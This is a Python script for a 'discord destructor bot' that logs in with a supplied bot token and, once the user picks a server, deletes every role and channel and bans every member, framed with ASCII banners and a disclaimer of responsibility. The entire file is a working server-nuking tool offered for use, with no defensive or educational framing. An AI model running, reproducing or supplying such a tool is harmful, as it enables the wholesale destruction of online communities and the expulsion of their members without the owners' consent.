import discord
import sys
import asyncio
from discord import message
from discord import guild
import os
from colorama import init
import colorama
from termcolor import colored
init()
print('author of script is not responsible for your actions.')
txt ="""
█▀▄ █▀▀ ▄▀▀ ▀█▀ █▀▀▄ ▄▀▄ ▀▄░▄▀ █▀▀ █▀▀▄  
█░█ █▀▀ ░▀▄ ░█░ █▐█▀ █░█ ░░█░░ █▀▀ █▐█▀ 
▀▀░ ▀▀▀ ▀▀░ ░▀░ ▀░▀▀ ░▀░ ░░▀░░ ▀▀▀ ▀░▀▀ 
"""
txt1 = """
██▀▄ ▀▄░▄▀     █░░ █░█ █▄░▄█ ▀ █▀▀ █▀▀▄ █▀▀ 
██▀█ ░░█░░     █░▄ █░█ █░█░█ █ █▀▀ █▐█▀ █▀▀ 
▀▀▀░ ░░▀░░     ▀▀▀ ░▀░ ▀░░░▀ ▀ ▀▀▀ ▀░▀▀ ▀▀▀ 
"""

def out_red(text):
    print(colored(text, 'red'))
def out_yellow(text):
    print("\033[33m {}" .format(text))
def out_blue(text):
    print("\033[34m {}" .format(text))

def out_pink(text):
    print("\033[35m {}" .format(text))
def out_green(text):
    print(colored(text, 'green'))

out_blue(txt)
out_blue(txt1)
out_yellow('Welcome to discord destructor bot!! made with love.')
out_red('Warning! This program is dangerous. Your bot must have admin access!!!')
out_pink('Enter your bot TOKEN https://discordapp.com/developers/applications/')
out_pink('Alt + Space   -> edit -> paste')
TOKEN = input('>>>')
out_blue('Loading...')
class MyClient(discord.Client):
    async def on_ready(self):
        out_yellow('logged as')
        out_yellow(self.user)
        print('\n')
        out_blue('DISCORD servers(guilgs) your bot in:')
        guilds = list(client.guilds)
        i = 0
        for guild in guilds:
            out = guild.name + ' | Number: ' + str(i)
            out_green(out)
            i += 1
        print('----------------------------------------------------------')
        out_pink('Input Number of server(guild) you want to destroy')
        b = int(input('>>>'))
        guild = guilds[b]
        os.system('cls')
        out_red('DELETING STARTED...')
        out_red('DELETING ROLES...')
        roles_list = guild.roles
        for role in roles_list:
            try:
                await role.delete()
            except:
                discord.errors.HTTPException
        os.system('cls')
        out_red('DELETING CHANNELS...')
        channel_list = guild.channels
        for channel in channel_list:
            try:
                await channel.delete()
            except:
                discord.errors.Forbidden
                os.system('cls')
                out_red('BOT IS NOT AN ADMIN!')
        os.system('cls')
        out_red('USERBANNING...')
        user_list = guild.members
        for member in user_list:
            try:
                await member.ban()
            except:
                discord.errors.Forbidden
        out_red('DELETING COMPLETE.')
        txt = """
░░██████░░░░░░░░░░░░░░░░██████░░
████░░░░████░░░░░░░░████░░░░████
████░░░░░░░░██░░░░██░░░░░░░░████
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░██████░░░░░░░░██████░░░░░░
░░░░██░░░░████░░░░████░░░░██░░░░
░░░░░░░░██░░██░░░░██░░██░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░████░░░░░░░░░░░░██████░░░░
░░░░░░░░░░██████████████░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        """
        out_red(txt)
        await asyncio.sleep(1)


client = MyClient()
client.run(TOKEN)
